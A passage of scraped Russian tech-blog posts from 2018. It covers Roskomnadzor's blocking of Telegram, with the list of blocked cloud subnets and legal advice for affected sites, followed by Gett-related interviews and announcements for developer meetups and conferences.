167.99.0.0/16 и 206.189.0.0/16, каждая из которых содержит по 65 тысяч IP-адресов (копия выгрузки).\n\r\nСогласно утренней выгрузке за 19 апреля, в списке заблокированных числится 56 подсетей размерностью от /24, до… /10.\n\n\nПолный список\nAmazon\n\n13.125.0.0/16\n13.56.0.0/14\n18.130.0.0/16\n18.144.0.0/16\n18.184.0.0/15\n18.194.0.0/15\n18.196.0.0/15\n18.236.0.0/15\n34.192.0.0/10\n35.156.0.0/14\n35.160.0.0/13\n35.178.0.0/15\n35.180.0.0/16\n52.192.0.0/11\n52.56.0.0/16\n52.57.0.0/16\n52.58.0.0/15\n52.64.0.0/12\n54.144.0.0/12\n54.160.0.0/12\n54.228.0.0/15\n54.64.0.0/13\n\nBlackberry\n\n\n68.171.224.0/19\n74.82.64.0/19\n103.246.200.0/22\n178.239.88.0/21\n\nDigitalOcean\n\n\n128.199.0.0/16\n139.59.0.0/16\n159.89.0.0/16\n159.203.0.0/16\n165.227.0.0/16\n167.99.0.0/16\n174.138.0.0/17\n188.166.0.0/17\n206.189.0.0/16\n\nGoogle\n\n\n23.251.128.0/19\n35.184.0.0/13\n35.192.0.0/12\n35.224.0.0/12\n\nTelegram\n\n\n91.108.4.0/20\n91.108.16.0/22\n91.108.56.0/22\n109.239.140.0/24\n149.154.160.0/20\n\nПрочие\n\n\n35.208.0.0/12 — Merit Network\n159.65.0.0/16 — phscare.org\n203.104.128.0/20 — linecorp.com\n203.104.144.0/21 — linecorp.com\n203.104.152.0/22 — linecorp.com\n\r\nНекоторые префиксы /22 были «схлопнуты» в один /20, объясняет хабрапользователь POPSuL, составивший список\n\r\nТаким образом, Роскомнадзор ведёт войну уже против трёх облачных операторов. От этого страдают десятки добропорядочных сайтов и миллионы обычных пользователей. \n\r\nДействия Роскомнадзора уже осудили многочисленные международные правозащитные организации. Эдвард Сноуден поддержал Дурова и осудил «тоталитарные попытки правительства России получить бэкдор к конфиденциальной переписке граждан».\n\n\r\nНекоторые эксперты сравнивают действия Роскомнадзора с поведением слона в посудной лавке — и осуждают именно тотальный характер веерных блокировок. Ранее с осуждением действий Роскомнадзора выступила пресс-секретарь МИД России. Советник президента Герман Клименко в эфире НТВ сказал: «имело бы смысл извиниться» за «эту сложную историю», и добавил: «Надеюсь, что дальше Роскомнадзор будет действовать более аккуратно».\n\r\nСбои в работе отмечены в системе поиска авиабилетов Kupibilet.ru, сервисе комментирования HyperComments, Сегодня ночью в блокировку попал префикс 52.192.0.0/11 от Amazon — и сразу были отмечены сбои на различных крупных ресурсах, таких как twitch.tv, behance.net, Adobe CC. Ранее сообщалось о частичной недоступности developer.mozila.org, сервиса такси Gett, сбоях в работе мессенджера Viber, курьерской службы «Птичка», сайта YouTube, веб-версии Skype, сайта Microsoft Azure и офисных веб-приложений. Также постарадали сервис NuGet, сервис заметок Evernote, музыкальный сервис Spotify, корпоративный мессенджер Slack, сервис автоматизации контекстной рекламы eLama, многочисленные VPN и прокси-сервисы. Управляющий школы английского языка Skyeng предположил, что из-за действий Роскомнадзора школа потеряет от 1 до 30 миллионов рублей за один вечер.\n\r\n«Похоже, скоро кроме Telegram в российском интернете большего ничего работать не будет», — шутят на Хабре.\n\r\nВ то же время Александр Жаров настаивает, что среди ресурсов, заблокированных из-за запрета Telegram, нет ни одного социально значимого: «Я должен сказать, что все подсети, прежде чем поступить на выгрузку, разбираются нашими специалистами. И мы уверенно можем заявить, что никаких социально значимых ресурсов на этих IP-адресах не содержится».\n\n\nПродажа билетов на сайте музеев Московского Кремля была приостановлена в связи с блокировкой одного из сервисов\n\r\nМногие чиновники продолжили использовать Telegram после начала блокировки и осудили веерную блокировку IP-адресов, но некоторые всё-таки поддержали действия Роскомнадзора. Например, спикер петербургского парламента Вячеслав Макаров резко осудил чиновников и депутатов, которые продолжают пользоваться мессенджером: «Пусть они посмотрят в глаза родным и близким погибших в апрельском теракте в прошлом году. Пусть посмотрят в глаза и послушают, чего им скажут», — заявил Макаров и напомнил, что перед терактом злоумышленники использовали мессенджер Telegram.\n\r\nКак сообщалось ранее, В Кремле поддерживают действия Роскомнадзора: «Блокировка будет продолжаться до тех пор, пока не будут выполнены необходимые условия», — сказал 17 апреля пресс-секретарь президента Дмитрий Песков. Позже он уведомил, что президент в курсе ситуации. Сегодня пресс-секретарь дал понять перспективу дальнейших действий: «Понятно, что для исполнения закона нужно время, вполне также можно согласиться и понять, что это [блокировка Telegram] не вопрос одного дня, — заявил журналистам Песков. — Давайте просто ещё какое-то время подождём». Вероятно, власти надеются, что Amazon, Google или Telegram не выдержат длительной блокады. В самом деле, для Роскомнадзора или российского бюджета она ничего не стоит в финансовом плане. Реальные финансовые убытки несут облачные сервисы (из-за потери клиентов) и сам Telegram. \n\r\nЭксперты расходятся в оценках, какую сумму тратит Telegram на обход блокировки. По оценке Александра Лямина из Qrator Labs, сейчас из-за блокировки Telegram теряет около $1 млн в сутки. Сооснователь Zello Алексей Гаврилов говорит, что большую часть года на обход блокировок тратилось менее $10 в день, но в последние несколько месяцев «в связи с ростом усердия Роскомнадзора» сумма увеличилась примерно до $70 в день. У Telegram нижняя планка затрат на обход блокировок составляет $5000 в день, но может быть и в десять раз больше, считает Гаврилов.\n\r\nРоскомнадзор пока формально не сдаётся, но начинает проявлять некоторые признаки слабости, фактически признаваясь в неэффективности нынешних методов. 18 апреля ведомство провело рабочее совещание с крупнейшими интернет-провайдерами для обсуждения дальнейшей стратегии, сообщает «Коммерсантъ». Пока решения найти не удалось. Вероятно, также на совещании обсуждали проблему с зависанием программно-аппаратного комплекса «Ревизор», который используется для мониторинга доступа к запрещённым сайтам, и инцидент с включением в реестр запрещённых сайтов IP-адресов, которые нужны для получения обновлений реестра запрещённых сайтов. Роскомнадзор попросил сисадминов вручную удалить эти адреса из реестра, иначе система блокировок не сможет дальше работать.\n\nЮридическая помощь\r\nВ первый дни блокады Рунета в правозащитную организацию «Агора» поступило более 120 обращений от владельцев интернет-сайтов и сервисов, пострадавших от действий Роскомнадзора. Юристы организации рекомендуют следующий алгоритм правового реагирования:\n\nОбщий алгоритм правового реагирования такой:\n\r\n1) Удостовериться, что дело действительно связано с блокировкой, что это не техническая проблема сервера, не ddos-атака, в конце концов.\n\r\n2) Зафиксировать доказательства: \r\n — проверить наличие доменного имени сайта и IP-адреса в реестре РКН blocklist.rkn.gov.ru. Сделать скриншоты этой страницы, а также страницы сайта с заглушкой оператора связи;\r\n — обратиться в РКН по адресу Hotlinerkn@rkn.gov.ru с запросом о причинах блокировки;\r\n — обратиться с жалобой на недоступность сайта к интернет-провайдеру, зафиксировать ответ (по электронной почте либо, в случае звонка — записав разговор с сотрудником поддержки);\r\n — получить сертификат на доменное имея сайта (это можно сделать у регистратора), либо сделать распечатку страницы whois.com, если там указаны ваши реквизиты.\n\r\n3) Обратиться с административным иском о признании незаконными действий и решений Роскомнадзора в суд (если сайт используется для коммерческой деятельности предпочтительнее арбитраж, если нет — суд общей юрисдикции). В какой конкретно суд, лучше дополнительно проконсультироваться.\n\r\n4) В случае, если блокировка осуществляется на основании решения Генпрокуратуры (это будет указано в реестре либо в уведомлении РКН, которые вы, возможно, получили), иск следует предъявлять Генпрокуратуре и РКН одновременно.\n\r\n5) В случае признания действий государственных органов незаконными у вас появится возможность требовать возмещения причиненного имущественного ущерба. Поэтому с самого начала необходимо фиксировать доказательсва расходов и ущерба (например, подтверждение оплаты за смену IP-адреса или расходы, связанные с простоем, выплатами возмещения клиентам, расходами на юриста и т.п.).\n\r\n6) В случае отказа в удовлетворении иска и после прохождения 4 инстанций можно обращаться в Европейский суд по правам человека. Срок подачи жалобы — 6 месяцев со дня вынесения определения по второй кассационной жалобе. У нас есть шаблонная жалоба, тут мы готовы помогать.\r\n30 юристов и адвокатов из нескольких российских городов выразили готовность вести судебные дела против Роскомнадзора и Генпрокуратуры в интересах пострадавших онлайн-сервисов. \n\r\nВ начале мая «Агора» планирует собрать все факты и составить обращение в Генпрокуратуру о проверке соблюдения законности действий Роскомнадзора. Затем вполне реалистично выглядит коллективный иск в Европейский суд по правам человека, считает «Агора».\n\r\nКроме того, адвокаты Telegram обжаловали решение суда о немедленной блокировке мессенджера .\n\nРост популярности Telegram в России\r\nПо статистике SimilarWeb, после начала блокировок суточная аудитория Telegram в России выросла на 27% до 1,2 млн, сообщает РБК. Количество скачиваний приложения Telegram для Android выросло за неделю более чем в два раза, до более 102 тыс. загрузок. Сейчас приложение установлено на 19,9% всех устройств, работающих на платформе Android в России (неделей ранее этот показатель составлял 19,5%). Из тех, у кого было установлено приложение, по данным на 16 апреля, его использовали 51,59% против 38,98% неделей ранее. Согласно статистике Deloitte, на платформе iOS наблюдается аналогичная ситуация: за год доля устройств на этой платформе с установленным приложением Telegram выросла почти вдвое.\n\n\n\r\nСервисы Telegram Analytics и Combot тоже фиксируют значительный рост популярности мессенджера у массовой аудитории. За одну неделю дневной охват вырос с 175 млн до 211 млн просмотров, дневной прирост подписчиков на каналы увеличился на 39% с 240 тыс. до 336 тыс. За неделю добавлено 1375 новых каналов, а ежедневное количество новых записей выросло на 9%.\n\n\n\r\nСуммарное количество просмотров пяти самых популярных решений для обхода блокировки составило 24 миллиона просмотров. Можно предположить, что абсолютное большинство пользователей Telegram уже разобрались в тонкостях установки SOCKS-прокси и VPN. А если кто-то не разобрался и его затронет блокада от Роскомнадзора — то он немедленно получит информацию от товарищей, коллег и родственников.\n\r\nРоскомнадзор пояснил, что блокада действует только в отношении Telegram. Остальных мессенджеров, в том числе WhatsApp, Viber, Facebook Messenger и Instagram, нет в реестре организаторов распространения информации (ОРИ). Те, кто присутствует в реестре ОРИ, должны хранить информацию о пользователях и идентифицировать их, а также по запросу сотрудничать с правоохранительными органами. В том числе, если сервис использует шифрования, передавать спецслужбам ключи для расшифровки сообщений.\n\nПримечание: При комментировании этого материала просим соблюдать правила Geektimes. Пожалуйста, воздержитесь от оскорблений и токсичного поведения. В комментариях работает постмодерация.", {"day": "19", "month": "апреля", "time": "12:48"}, {"rate": 95, "views": 69000}], ["Epic Growth Story — флешмоб от Gett и Epic Growth Conference, где специалисты по продуктам, маркетингу и дизайну делятся эпичными историями роста. В формате блиц-интервью Евгений Лисовский (Maps.me) делится гроусхаками и экспериментами, которые принесли кратный продуктовый рост. \n\r\nДелитесь своими историями на Facebook с хештэгом #epicgrowthstory. Лучшие авторы получат призы от Gett и попадут в подборку и на сайт.\n\n\r\nСмотрите интервью и читайте расшифровку под катом.\n\nЭксперименты, которые принесли кратный рост продукту?\n\r\nУ нас за два года вырос retention где-то в два раза. Retention — ключевая такая метрика. Но, поскольку мы – продуктовая компания (это не e-commerce, где ты берешь больше ассортимент, берешь больше денег, и, таким образом, можешь очень быстро вырасти). В Maps.me хаки – скорее продуктовые. В апреле 2016 мы запустили возможность редактирования карт. Это привлекло дополнительно большую аудиторию контрибьюторов, которые не только увлеченно улучшают карты, но и помогают развиваться всему сообществу OpenStreetMap.\n\nКакой продукт зацепил?\n\r\nМне очень понравился продукт RealtimeBoard. Его принесла наш новый дизайнер. Я использовал Google Docs Presentations. Просто стрелки и картинки, чтобы составить какое-то ТЗ. И тут я увидел RealtimeBoard. Круто то, что это безлимитная доска с преимуществом коллаборативной работы. Все продумано до мелочей. Даже, если сравнивать с Google Docs Presentations, видно, как тщательно команда RealtimeBoard проработала продукт. Пользователю действительно удобно и комфортно.\n\nКакой продукт хочется полностью переделать?\n\r\nЕсть YouTube, которым пользуются все. У него есть одна фундаментальная проблема – плохая каталогизация контента. В «ЛитРес» мы, например, тщательно прорабатывали каталог, чтобы в нем были жанры и поджанры, чтобы можно было выбрать необходимую тематику и уже исходя из нее выбирать книги. Невозможно выбрать «поиском», когда в каталоге 100 тысяч книг, особенно, когда не знаешь, что тебе нужно.\n\r\nВ YouTube есть проблема: нет никаких жанров. Есть просто голый поиск, в который ты что-то «забиваешь». Я много подписан на разные каналы про neuroscience, астрофизику и так далее. Но на главной странице абсолютно ничего не структурировано.\n\r\nЕще один продукт, который хочется переделать… Я давно использую собственную методику управления проектами. Она работает на Google Docs Project. В таблицах делаю Action Plan, где ставлю название задачи, дедлайн, статус. Если задача выполнена – скрывается. И, соответственно, у тебя всегда есть актуальный список задач с приоритетами. Но не хватает связки с календарем. Я очень часто использую календарь для планирования своего рабочего дня и недели. Но вот связки одного с другим пока нет. Есть продукты, которые пытаются это совместить. Но идеального продукта я пока не видел. Хорошо, чтобы это было в календаре Google Docs, например. \n\nОМТМ (One Metric That Matters)?\n\r\nВ первую очередь, это retention – возвращаемость аудитории. Это одна из причин по которой «Мойка Мойка», в том числе, не полетела. Причина – bad user experience. Человек приезжал на автомойку, а там, на самом деле, статус был неактуальным. И он: «О! Не работает». И все. Retention падает. Падает retention – падает юнит-экономика. По сути, кривая retention – напрямую коррелирует с LTV (Lifetime Value). То есть, с деньгами, которые вы можете получить с проекта. Неважно, как: freemium модель, premium модель, рекламная модель. \n\r\nRetention – основополагающая метрика. Если вы достигаете высокого retention, то все у вас будет хорошо. Это фактор, который включает в себя практически все – и качество продукта, и саму бизнес-идею: работает она или не работает. \n\nПолезный framework для разработки продукта? \n\r\nМы используем Atomic Design framework.\n\nКак улучшить UX-продукта?\n\r\nРаботайте с обратной связью с вашей аудиторией. Ваша аудитория может сказать вам очень многое, если вы будете правильно задавать вопросы. Проводите опросы, исследования. У нас очень круто это работает. Мы регулярно проводим достаточно масштабные опросы. И очень большая часть нашей аудитории охотно соглашается отвечать на множество вопросов. В последний раз мы собрали 60 тысяч ответов, разослав при этом предложение пройти опрос примерно 300 тысячам пользователям. \n\nАНА-момент в ЛитРес и Maps.me?\n\r\nВ ЛитРес в какой-то момент времени были все форматы (и сейчас до сих пор есть). 14 форматов. В 14 форматах есть книга, хорошо сверстанная. Многим очень тяжело перейти от концепции бумажных книг к электронным. \n\r\nНапример, в индустрии программного обеспечения есть такое понятие: людям трудно доверять тому, что нельзя уронить на ногу. Почему появились коробочные ПО? Это способ людей перенести из физического мира в виртуальный. То же самое, наверное, и с книгами. \n\r\nКогда ты понимаешь, что ты можешь ее скачать, положить на жесткий диск, и она твоя навсегда. Наверное, это такой АНА-момент в ЛитРес. Можно также назвать УТП или ДНК. \n\r\nВ Maps.me АНА-момент – это то, что приложение работает без интернета. Это ключевое УТП. Если ты «in the middle of nowhere», и у тебя ничего не работает – открываешь оффлайн карты Maps.me и ты спасен.\n\nКак проверять идеи до начала разработки?\n\r\nМного аналитики – изучать опыт других проектов, особенно проектов похожей тематики. Рекомендую: у публичной компании на сайте есть раздел «Investor Relations», где представлено много информации, презентаций для инвесторов. Можно еще послушать «phone call» по результатам квартала или года (там часто задают вопросы, из которых можно многое подчеркнуть для себя). \n\r\nТакже советую отличный ресурс «Think with Google». В нем много полезной аналитики, которую Google делает на регулярной основе по разным тематикам, например, E-commerce, Travel.\n\nГлавное качество СРО?\n\r\nХорошо понимать аудиторию и умение спорить, отстаивать свою позицию по продуктовому видению. Умение договариваться. Перфекционизм. Делать офигительно.\n\r\nОставляйте посты с хештегом #epicgrowthstory и делитесь своими лучшими историями роста продукта. Авторы самых эпичных историй получат призы от наших партнеров Gett и попадут на сайт и в телеграм epicgrowth.", {"day": "18", "month": "апреля", "time": "17:34"}, {"rate": 17, "views": 1700}], ["Привет. Хочу пригласить бэкендеров на Backend United #1. Винегрет — митап, посвященный кросс-языковым решениям для разработки серверной части. Обсудим общие подходы и инструменты для разных языков. Вы услышите доклады от представителей Gett RnD и Avito. Встреча пройдет в среду, 18 апреля, в московском офисе Avito. \nПриходите на митап и приглашайте коллег. Под катом — тезисы выступлений, ссылки на регистрацию и видеотрансляцию встречи. \n\nДоклады\nBuilding observable applications. Михаил Кабищев (Gett RnD)\n\r\nС запуском приложения на продакшене начинается самое интересное. Ведь всем хочется спать спокойно по ночам и быть уверенным в его корректной работе. Я расскажу про базовые техники и подходы, которые не спасут вас от ошибок и падений продакшена, но помогут их идентифицировать и быстро среагировать: логирование, метрики и распределенная трассировка.\n\n\nОдин кликстрим на все бэкенды. Внедрение инструментария для отправки аналитических событий в php, go, python. Дмитрий Хасанов (Avito)\n\r\nРасскажу, как нам удается применять общие правила сбора и отправки аналитических событий на разных платформах, среди которых бэкенды проектов на php, go, python. Почему бэкенды — хорошо, а фронтенды — сложнее. Как прокачать миллиарды событий и не лишиться рассудка.\n\n\nЭтот страшный кросс-платформенный мир. Александр Емелин (Avito, Centrifugo)\n\nCentrifugo — кросс-платформенное open-source решение для отправки сообщений пользователям в реальном времени. Расскажу про техники, которые позволили реализовать отдельностоящий сервер, интегрирующийся с бэкендом, написанном на любом языке программирования, про современные транспорты доставки сообщений в браузеры и мобильные клиенты. Про проблемы поддержки такого кросс-платформенного решения. О попытке выделить ядро сервера в отдельную библиотеку для языка Go. Расскажу про реализацию протокола второй версии сервера, который может работать как с JSON, так и с Protobuf. Упомяну о некоторых важных оптимизациях при работе с большим количеством постоянных соединений.\n\n\nРасписание\n18:30 — 19:00 — Регистрация\r\n19:00 — 19:45 — Building observable applications — Михаил Кабищев (Gett RnD)\r\n19:50 — 20:35 — Один кликстрим на все бэкенды. Внедрение инструментария для отправки аналитических событий в php, go, python — Дмитрий Хасанов (Avito)\r\n20:40 — 21:00 — Кофе-брейк\r\n21:00 — 21:45 — Этот страшный кросс-платформенный мир — Александр Емелин (Avito, Centrifugo)\nПароли и явки\nУчастие в мероприятии бесплатное, регистрация обязательна.\r\nАдрес: офис компании Avito, Лесная 7.\r\nТрансляция будет организована в день мероприятия на нашем youtube-канале AvitoTech. Подписывайтесь, чтобы ничего не пропустить.\nДо встречи.", {"day": "5", "month": "апреля", "time": "16:16"}, {"rate": 37, "views": 3900}], ["29 марта Mobio, Getloyal и Appsflyer при поддержке myTarget, Appodeal, Appnext, Gett организуют вторую международную конференцию по продуктовому маркетингу Epic Growth Conference 2018. \n\r\nБолее 600 представителей крупнейших продуктовых компаний соберутся в Москве, чтобы обменяться опытом и послушать приглашенных докладчиков из SkyScanner, Яндекс.Такси, PandaDoc, Intercom, Aviasales и др. \n\n\n\r\nПредставители продуктовых компаний могут подать заявку на бесплатный билет на сайте egconf.ru. Количество мест ограничено, ведется ручной отбор заявок.\n\r\nДокладчики EGC 2018:\n\n\nАнна Булдакова (Product Manager, Intercom);\nБайрам Аннаков (CEO, App in the Air);\nДаниил Шулейко (Управляющий директор, Яндекс.Такси);\nАнтон Байцур (CPO, Aviasales);\nМикита Микадо (CEO, PandaDoc);\nАлексей Писаревский (CEO, Getloyal);\nКатерина Тониоло (Principal Growth Manager, Skyscanner);\nФердинанд Гетзен (Head of Growth, Recruitee);\n\n\r\nСледите за обновлениями на сайте, читайте новости по продуктовому маркетингу в telegram-канале @epicgrowth.", {"day": "27", "month": "февраля", "time": "14:14"}, {"rate": 22, "views": 1900}], ["Пока ребята из бекендов и фронтендов шлифуют последние фразы для рассказа о своих секциях, ребята из тестирования уже всё проверили.\n\n\n\nО чём секция тестирования\r\nПоговорим о процессах и подходах в тестировании, как надо и не надо тестировать. Уделим внимание автоматизации и продолжим копать темы прошлого года: про нагрузочное тестирование и тестирование под iOS. А в продолжение доклада о тестовой Android-ферме поговорим про ферму под iOS и как backdoor’ы в Android-приложении помогают автоматизации.\n\r\nКстати, в этом году нашли дополнительный зал в Экспо, отказались от полумер и сделали секцию качества на два дня — 14 выступлений в основной программе и разговоры в экспертной зоне.\n\nПро настоящее и будущее тестирования \r\nИногда в гонке за автоматизацией можно забыть, что мы делаем и зачем. Помечтаем о будущем QA, вспомним о важных процессах ручного тестирования и лучших/худших практиках.\n\n Валерий Бурмистров из TeamViewer расскажет о настоящем и будущем тестирования.\n\n«Как и вся IT-сфера, тестирование быстро развивается в разных направлениях. Посмотрим на тренды в тестировании и попробуем немного заглянуть в будущее.»\n\n Jan Jaap Cannegieter из Squerist выступит с докладом о Groupwise Testing или почему один тестировщик — хорошо, а много — ещё лучше. \n\n«I will what bug hunts and test mobs are, how they are organized and what success factors and pitfalls are.»\r\n⠀\r\n⠀\n Игорь Гольдшмидт из Gett поделится опытом, как надо и не надо тестировать мобильное приложение.\n\n«В моем докладе вы узнаете о проблематичных зонах в тестировании клиентской части мобильного приложения на примере команды звездолета Дискавери, которая тестировала свой новый фичер — споровый двигатель.» \n\nПро бекенды \r\nПри автоматизации End-To-End тестирования мы тратим много сил на написание и поддержание тестов в актуальном состоянии. В прошлом мы уже раскрывали Model Based Testing, App Crawling и Monkey Testing. Подходы позволяют заменить часть «ручной» автоматизации за счёт генерации сценариев и автоматического поиска регрессии. В этом году посмотрим на инструмент Diffy, который ищет баги в веб-сервисах.\n\n\n«Diffy is a tool used at Twitter, Airbnb, and many other companies to automatically catch regressions in backend services before they are deployed to production. This talk will cover the fundamental concepts behind Diffy and how its automation helps achieve peace of mind for service owners, devops, and QA folks.»\n\nПро мобилки \n Глеб Головин из 2ГИС выпустит сиквел своего рассказа о ферме тестирования под мобилки. В прошлом году был Android, в этом — iOS.\n\n«Когда твоя команда поддерживает ферму Android-девайсов под прогон UI/Unit/Benchmark тестов, рано или поздно приходит начальник и говорит: „А давайте так же, только под iOS“»\n\n Rajdeep Varma из Badoo поделится опытом, как с помощью backdoor’ов повысить надёжность и скорость End-To-End тестов Android-приложения.\n«A very powerful feature is missing in Appium for Android: the ability to call application code from automation code like Calabash Backdoors do. We modified Appium such that we could instrument our app under test. This makes our application more testable and our tests more predictable»\n\nПро нагрузку \r\nВ этот раз у нас три дополняющих друг друга выступления о нагрузочном тестировании.\n\n Eric Proegler из Medidata Solutions расскажет как правильно интерпретировать результаты нагрузочного тестирования, ставить и проверять гипотезы. \n\n«Results interpretation and reporting is where a performance tester earns their stripes. We’ll look at some results from actual projects and together puzzle out the essential message in each.»\n\n Михаил Косыхин из Lamoda поставит все это в практический контекст подготовки к Black Friday.\n\n«Расскажу, что произойдёт, если выбрать неправильные сценарии и профиль нагрузки, как подготовиться к тестированию производительности, об ошибках и опыте.»\n\n Денис Трифонов расскажет как в 2ГИС поставили нагрузочное тестирование на поток и непрерывно тестируют 30 проектов.\n\n«Поделюсь опытом построения автоматизированной инфраструктуры для тестирования производительности 30 проектов от бекендов до мобилок.» \r\n⠀\n\nИ ещё \nАлексей Виноградов расскажет про KISS-driven подход в автоматизации тестирования, и объяснит, почему некоторые популярные приёмы программирования могут стать ненужными или даже вредными в коде тестов. \n\nАлексей Чурбанов из Kaspersky Lab расскажет как автоматизированное тестирование помогает обнаружить проблемы совместимости как можно раньше, какие сложности могут возникнуть в процессе и как с ними справляться.\n\r\nА вместе с Мариной Ремневой из Wrike посчитаем сколько «ой» в слове «деплой» и узнаем как деплоить монолитный продукт, когда над ним одновременно работают 17 команд. Ой.\n\r\nПро QA-секцию всё. За остальными спикерами приглашаем на сайт CodeFest.", {"day": "22", "month": "февраля", "time": "10:16"}, {"rate": 14, "views": 2500}], ["Всем привет!\n\r\nПродолжаем рассказывать про GopherCon Russia, который пройдет 17 марта в Москве. В прошлом посте мы прошлись по первой половине программы, а теперь она готова полностью. Например, на конференцию приедут и выступят ведущий подкаста Go Time Brian Ketelsen и технический евангелист Microsoft Ashley McNamara.\n\r\nНапомним, что будет два параллельных потока докладов с 10.00 до 19.00, огненное афтепати в баре с 19.00 и до упора, крутые активности от наших партнеров. Кстати, 16 марта тоже будет пара камерных событий о Go, подробности coming soon. На конференцию ждем 400 участников (200 из них уже зарегистрировались), присоединяйтесь!\n\r\nЕсли вы очень-очень любите Go, то можете не читать дальше, а сразу регистрироваться на сайте. Цена билета — 7000 рублей.\n\nИтак, кто и о чем еще расскажет:\n\nBrian Ketelsen, организатор GopherCon в Штатах, ведущий подкаста Go Time, Dev Advocate в Microsoft и open-source энтузиаст.\nGOPATH and compiler references. \r\nThe 'go' command line tools provide a convenient and friendly interface to the underlying compiler and linker. But they're not the only show in town. In this talk, I'll show you how you can compile Go code without using the `go` command, by writing our own compiler that doesn't rely on GOPATH to find imported code.\n\nAshley McNamara, технический евангелист Microsoft, ментор в WeWork, General Assembly, AngelHack и CapitalFactory, организатор Redis Austin, Big Data Analytics Club и Austin All Girl Hack Night. А еще Эшли рисует прекрасных гоферов! \nGo best practices. \n\n\nДмитрий Вьюков, Google. Создатель race detector'а и execution tracer'а в Go, автор многих улучшений runtime языка. Приложил руку к поддержке параллелизма и многоядерности: параллельная сборка мусора, планировщик горутин, каналы, примитивы синхронизации и т.д. \nФаззинг: новое юнит тестирование.\r\nФаззинг — это тестирование программ на неправильных, неожидаемых или случайных входных данных. В докладе я расскажу о типах фаззеров, о том, как они работают и о существующей реализации для Go — go-fuzz. Мы напишем и запустим настоящий фаззер. Найдём ошибки в стандартной библиотеке за пару минут. Так же я расскажу о том, как фаззеры могут угадывать правильные CRC чексуммы во входных данных, помогать с регрессионным тестированием, находить логические ошибки в коде и о том, как мы используем фаззинг в Google.\n\n\nBrad Fitzpatrick, Google. Участник команды Go, автор многих сетевых пакетов стандартной библиотеки. Предыдущие творения: LiveJournal, OpenID, memcached.\nGo: looking back and looking forward.\n\n\n\nВадим Марковцев, source{d}: Google Developer Expert по машинному обучению, непримиримый пользователь Open Source. Бывший системный программист, сегодня делает вид что знает глубокое обучение и евангелизирует ML на исходном коде. Страдает от отсутствия generics в Go.\nКак измерить настроение кода в Git репозитории. \r\nБерём Sentiment Neuron — модель определения тональности текста и биндинги Tensorflow к Go. Вытаскиваем комментарии из исходников с помощью Babelfish и прогоняем репозиторий через Hercules. В итоге несколькими строчками строим график как менялась тональность разработки с течением времени.\n\n\nЕлена Граховац, работает над RTB-системой в компании DCMN и является соведущей подкаста GolangShow. Любит решать задачи по автоматизации всевозможных процессов и, конечно, использует для этого Go.\nАвтоматизируем построение карты сервисов. \r\nЕсли ваш проект состоит из всевозможных сервисов, хранилищ и брокеров сообщений, вы, возможно, задумывались о построении карты взаимодействия всех этих ресурсов. С картой, составленной вручную, возникает много проблем: она постоянно устаревает, не предоставляет необходимый уровень детализации, ссылки на документацию и другие полезные материалы. \r\nПоговорим о том, как можно автоматизировать составление такой карты и написать инструмент, позволяющий строить её в реальном времени. \n\n\nАндрей Дроздов, шесть лет в IT, разработал пилотную версию шардинга для Tarantool 1.6, автор tarantool-debugger. Сейчас работает в команде поиска Avito.\nСтроим поисковую экосистему на Go. \r\nВ своем докладе я расскажу об устройстве поисковых движков на живых примерах, о том, что уже сделано в Go-сообществе на эту тему, сравню производительность «самопального» поискового движка на Go и решения на фреймворке riot. Кроме того, расскажу как строить поисковую инфраструктуру в компании и быстро вводить в эксплуатацию новые алгоритмы поиска.\n\n\nОлег Шевелев, ivi.ru. Пишет на Golang больше трёх лет, за это время делал бесшовную миграцию Redis-класстеров, микросервисы в k8s, различные парсеры, open-source.\nGometalinter наше всё. \r\nУчимся тестировать код без написания тестов (и с ними тоже), делаем свои линтеры и знаем о коде больше чем раньше.\n\n\nВиталий Левченко, тимлид в megafon.tv, пишет на Go с релиза. Занимался разработкой высоконагруженного дейтинга и рекламы. Организовывал Go-митапы в Питере.\nВы пишете тесты неправильно. \r\nБывает, что вы написали код, прогнали unit тесты, и после проверяете результат руками в разных кейсах? Часто ли находятся баги, регрессии в вашем приложении, которые не поймали unit тесты? У вас есть ощущение, тесты у вас работают плохо? Или наоборот, вы на тесты тратите слишком много времени? Многие учились писать тесты по наитию, писали по остаточному принципу. Это создало ту картину, что мы видим вокруг себя. Я расскажу, какие проблемы могут быть с вашими тестами, как сделать их хорошо, и как научиться делать это систематически. На Go.\n\n\nКонстантин Черкасов, командует командой поиска в Lazada (Alibaba Group) и до сих пор не сошёл с ума. В мире Go с 2012 года.\nOpenTracing не только для распределенной трассировки. \r\nРаспределенная трассировка (Distributed Tracing) существенно упрощает эксплуатацию больших систем с множеством микросервисов. Однако это не означает, что трассировка бесполезна для простых сервисов и монолитных приложений. \r\nВ докладе пойдет речь об OpenTracing, как об унифицированном подходе к инструментированию backend-сервисов, который применим не только в больших системах. \n\n\r\nЗа кадром остался только один спикер на букву Э, но мы все еще держим интригу :)\r\n*эту шутку поймут те, кто обсуждает конференцию в slack.golang-ru.com, канал #gophercon.\n\r\nПриходите! Билет сейчас стоит 7000 рублей, но с 1 марта цена снова поднимется, не откладывайте.\r\nВсе подробности и регистрация на сайте. А следить за анонсами можно в телеграм-канале или твиттере.\n\r\nОгромное спасибо компаниям-партнерам, которые делают конференцию возможной!\nГенеральный партнер — Gett.\nЗолотые партнеры — IToolLabs и Avito.\nСеребряные партнеры — JetBrains и Neuron.Digital.\n\nУвидимся 17 марта в Москве!", {"day": "7", "month": "февраля", "time": "07:12"}, {"rate": 20, "views": 3200}], ["Как и было обещано, представляем вторую часть подборки крупных и полезных для IT-специалистов мероприятий 2018 года — или, по крайней мере, первой его половины. В этом выпуске мы сосредоточимся на разработке в разных ее проявлениях: мобильные приложения, веб, блокчейн, большие данные, облака, высоконагруженные системы и так далее. Более мелкие события местного значения мы планируем и дальше освещать в регулярных дайджестах; что же касается зарубежных конференций, ссылки на расширенный их список вы можете найти в конце статьи.\n\n\n\nРоссия и страны СНГ\nInoThings++\n\nКогда: 29-30 января\nГде: Москва, 1-й Зачатьевский пер., 4, Инфопространство \nУсловия участия: 17 000 руб.\n\r\nПрикладная конференция, на которой практики из сферы IoT могут поделиться опытом и наработками с подкованной аудиторией. Доклады будут касаться как аппаратной составляющей (чипы, микроконтроллеры, процессоры, датчики), так и программной (IoT платформы, экосистемы — их внутреннее устройство и равнение). Помимо классических тем вроде безопасности, тестирования и передачи данных, в программе также отведено место для двух «периферийных» секций — учебного трэка, где желающих познакомят с принципами прототипирования, и бизнес-трэка, на котором будут обсуждаться новые бизнес-модели и приводиться успешные кейсы. С достижениями участников можно будет познакомиться в выставочной зоне.\n\nDevGAMM 2018\n\r\nКогда: 1-2 февраля\r\nГде: 